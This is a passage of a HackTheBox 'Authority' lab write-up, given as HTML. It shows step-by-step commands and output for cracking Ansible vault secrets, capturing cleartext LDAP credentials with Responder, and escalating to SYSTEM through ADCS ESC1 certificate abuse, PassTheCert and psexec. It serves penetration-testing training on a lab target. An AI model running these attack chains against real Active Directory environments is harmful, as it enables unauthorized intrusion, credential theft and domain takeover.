&lt;SNIP&gt;

</pre></table></code></div></div><h2 id="shell-as-svc_ldap"><span class="mr-2">Shell as svc_ldap</span><a href="#shell-as-svc_ldap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="asnsible-files"><span class="mr-2">Asnsible Files</span><a href="#asnsible-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We have downloaded a folder called Automation which contains Anisble files.</p><p><a href="/assets/Hackthebox/Authority/image-5.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-5.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Under Ansible &gt; PWM &gt; defaults &gt; main.yml we can see some credentials.</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>
<span class="na">pwm_run_dir</span><span class="pi">:</span> <span class="s2">"</span><span class="s">"</span>

<span class="na">pwm_hostname</span><span class="pi">:</span> <span class="s">authority.htb.corp</span>
<span class="na">pwm_http_port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">"</span>
<span class="na">pwm_https_port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">"</span>
<span class="na">pwm_https_enable</span><span class="pi">:</span> <span class="kc">true</span>

<span class="na">pwm_require_ssl</span><span class="pi">:</span> <span class="kc">false</span>

<span class="na">pwm_admin_login</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
          <span class="s">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
          <span class="s">6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span>
          <span class="s">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
          <span class="s">6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span>
          <span class="s">3438</span>

<span class="na">pwm_admin_password</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
          <span class="s">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
          <span class="s">3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span>
          <span class="s">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
          <span class="s">3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span>
          <span class="s">6531</span>

<span class="na">ldap_uri</span><span class="pi">:</span> <span class="s">ldap://127.0.0.1/</span>
<span class="na">ldap_base_dn</span><span class="pi">:</span> <span class="s2">"</span><span class="s">DC=authority,DC=htb"</span>
<span class="na">ldap_admin_password</span><span class="pi">:</span> <span class="kt">!vault</span> <span class="pi">|</span>
          <span class="s">$ANSIBLE_VAULT;1.1;AES256</span>
          <span class="s">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
          <span class="s">3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span>
          <span class="s">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
          <span class="s">3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span>
          <span class="s">3764</span>

</pre></table></code></div></div><h3 id="credentials-recovery"><span class="mr-2">Credentials Recovery</span><a href="#credentials-recovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The values in the file are protected by Ansible vault. We can use <code class="language-plaintext highlighter-rouge">ansible2john</code> which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
<span class="nv">$cat</span> ldap_admin_password 
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764

<span class="nv">$cat</span> pwm_admin_login 
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

<span class="nv">$cat</span> pwm_admin_password 
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>
<span class="nv">$ansible2john</span> ldap_admin_password pwm_admin_login pwm_admin_password | <span class="nb">tee </span>ansible_hashes
ldap_admin_password:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93<span class="k">*</span>dfd9eec07341bac0e13c62fe1d0a5f7d<span class="k">*</span>d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwm_admin_login:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d<span class="k">*</span>e041732f9243ba0484f582d9cb20e148<span class="k">*</span>4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5<span class="k">*</span>1dff07007e7a25e438e94de3f3e605e1<span class="k">*</span>66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5

</pre></table></code></div></div><h3 id="hashcat"><span class="mr-2">Hashcat</span><a href="#hashcat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, we can use hashcat to crack all the hashes.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>
<span class="nv">$hashcat</span> ansible_hashes /usr/share/wordlists/rockyou.txt <span class="nt">--user</span>

<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5<span class="k">*</span>1dff07007e7a25e438e94de3f3e605e1<span class="k">*</span>66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#<span class="nv">$%</span>^&amp;<span class="k">*</span>
<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d<span class="k">*</span>e041732f9243ba0484f582d9cb20e148<span class="k">*</span>4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#<span class="nv">$%</span>^&amp;<span class="k">*</span>
<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93<span class="k">*</span>dfd9eec07341bac0e13c62fe1d0a5f7d<span class="k">*</span>d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#<span class="nv">$%</span>^&amp;<span class="k">*</span>

</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>
<span class="nv">$cat</span> ldap_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123

<span class="nv">$cat</span> pwm_admin_login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm

<span class="nv">$cat</span> pwm_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23

</pre></table></code></div></div><h3 id="pwm-access"><span class="mr-2">PWM Access</span><a href="#pwm-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since we have the credentials we can try to login to the website with it. The password <code class="language-plaintext highlighter-rouge">pWm_@dm!N_!23</code> works to login to the configuration manager.</p><h3 id="configuration-manager"><span class="mr-2">Configuration manager</span><a href="#configuration-manager" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="/assets/Hackthebox/Authority/image-6.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-6.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/Hackthebox/Authority/image-7.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-7.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="configuration-editor"><span class="mr-2">Configuration editor</span><a href="#configuration-editor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can also login to the Configuration Editor with the same credentials <code class="language-plaintext highlighter-rouge">pWm_@dm!N_!23</code></p><p>In LDAP connection config we got the hostname <code class="language-plaintext highlighter-rouge">authority.authority.htb</code> and the username <code class="language-plaintext highlighter-rouge">svc_ldap</code>. The credentials are store but we cannot view it.</p><p><a href="/assets/Hackthebox/Authority/image-8.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-8.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="responder"><span class="mr-2">Responder</span><a href="#responder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can now use reponder to grab the ldap credentials. We will open responder and start listening on the <code class="language-plaintext highlighter-rouge">tun0</code> interface and <code class="language-plaintext highlighter-rouge">port 389</code>.</p><p><code class="language-plaintext highlighter-rouge">$sudo responder -I tun0</code></p><p><a href="/assets/Hackthebox/Authority/image-9.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-9.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Once we configure LDAP url to our interface and click on test LDAP profile, we can get the LDAP credentials in clear text.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
<span class="o">[</span>LDAP] Cleartext Client   : 10.10.11.222
<span class="o">[</span>LDAP] Cleartext Username : <span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
<span class="o">[</span>LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">netexec</code> winrm we can test the credentials and we can see that we can get shell acess as <code class="language-plaintext highlighter-rouge">svc_ldap</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
<span class="nv">$netexec</span> winrm 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</pre></table></code></div></div><h3 id="evil-winrm"><span class="mr-2">Evil-winrm</span><a href="#evil-winrm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We got shell as <code class="language-plaintext highlighter-rouge">svs_ldap</code> using <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
<span class="nv">$evil</span><span class="nt">-winrm</span> <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap&gt;

</pre></table></code></div></div><h2 id="shell-as-administrator"><span class="mr-2">Shell as Administrator</span><a href="#shell-as-administrator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="adcs-exploitation"><span class="mr-2">ADCS Exploitation</span><a href="#adcs-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will use <code class="language-plaintext highlighter-rouge">certipy</code> on our attacker machine to enumerate ADCS. We can use find command to identify templates and use -vunlerable option to only show the vulnerables ones.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre>
<span class="nv">$certipy</span> find <span class="nt">-dc-ip</span> 10.10.11.222  <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA
<span class="o">[!]</span> Got error <span class="k">while </span>trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via RRP
<span class="o">[!]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption <span class="k">for </span>Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
    <span class="o">[!]</span> Vulnerabilities
      ESC1                              : <span class="s1">'AUTHORITY.HTB\\Domain Computers'</span> can enroll, enrollee supplies subject and template allows client authentication

</pre></table></code></div></div><p>It identifies a template <code class="language-plaintext highlighter-rouge">CorpVPN</code> and this is vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>.</p><p>According to this <a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">post</a>. Templates vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code> must have the following configurations:</p><ul><li>Client Authentication: True<li>Enabled: True<li>Enrollee Supplies Subject: True<li>Requires Management Approval: False<li>Authorized Signatures Required: 0</ul><p>This conditions matches the output that comes out of authority but with only one difference. In this, case <code class="language-plaintext highlighter-rouge">Domain Computers</code> can enroll with this templates, not <code class="language-plaintext highlighter-rouge">Domain Users</code>.</p><h3 id="creating-computer-account"><span class="mr-2">Creating Computer Account</span><a href="#creating-computer-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The settings that allows a user to add a computer to domain is the <code class="language-plaintext highlighter-rouge">ms-ds-machineaccountquota</code>. We can use <code class="language-plaintext highlighter-rouge">netexec</code> to view the machinequota.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>
<span class="nv">$netexec</span> ldap 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-M</span> maq
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAPS       10.10.11.222    636    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.10.11.222    389    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10

</pre></table></code></div></div><p>This means we can add upto 10 computers. We can add computers using <code class="language-plaintext highlighter-rouge">impacket-addcomputer</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>
<span class="nv">$impacket</span><span class="nt">-addcomputer</span> Authority.htb/svc_ldap:<span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-computer-name</span> testerpc <span class="nt">-computer-pass</span> <span class="s1">'Password@123'</span> <span class="nt">-method</span> LDAPS <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account testerpc<span class="nv">$ </span>with password Password@123.

</pre></table></code></div></div><p>With the computer account created earlier, certipy will create a certificate along with the private key.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
<span class="nv">$certipy</span> req <span class="nt">-username</span> testerpc<span class="nv">$ </span><span class="nt">-password</span> Password@123 <span class="nt">-ca</span> AUTHORITY-CA <span class="nt">-dc-ip</span> 10.10.11.222 <span class="nt">-template</span> CorpVPN <span class="nt">-upn</span> administrator@authority.htb <span class="nt">-dns</span> authority.htb
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with multiple identifications
    UPN: <span class="s1">'administrator@authority.htb'</span>
    DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator_authority.pfx'</span>

</pre></table></code></div></div><h3 id="passthecert"><span class="mr-2">PassTheCert</span><a href="#passthecert" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can use certipy auth command to get the NTLM hash of the administrator but this failed.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>certipy  auth <span class="nt">-pfx</span> administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found multiple identifications <span class="k">in </span>certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Please <span class="k">select </span>one:
    <span class="o">[</span>0] UPN: <span class="s1">'administrator@authority.htb'</span>
    <span class="o">[</span>1] DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">&gt;</span> 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@authority.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span>-] Got error <span class="k">while </span>trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP<span class="o">(</span>KDC has no support <span class="k">for </span>padata <span class="nb">type</span><span class="o">)</span>
</pre></table></code></div></div><p>This happens “when a domain controller doesn’t have a certificate installed for smart cards”. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.</p><p>Alternatively, we can use <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a> attack.</p><p>To perform the PassTheCert attack. We will need key and cert in seprate files. We will use certipy to get these files.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$python3</span> passthecert.py <span class="nt">-action</span> ldap-shell <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222

<span class="c">#help</span>
add_computer computer <span class="o">[</span>password] <span class="o">[</span>nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
add_user new_user <span class="o">[</span>parent] - Creates a new user.
add_user_to_group user group - Adds a user to a group.


<span class="c"># add_user_to_group svc_ldap administrators</span>
Adding user: svc_ldap to group Administrators result: OK

</pre></table></code></div></div><p>svc_ldap has been added to the administrators group. We can use <code class="language-plaintext highlighter-rouge">psexec</code> to confim that we can login as administrator.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>
impacket-psexec authority.htb/svc_ldap:<span class="s1">'lDaP_1n_th3_cle4r!'</span>@10.10.11.222 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.11.222.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file YZVCWrHm.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.11.222.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service NYke on 10.10.11.222.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service NYke.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4644]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

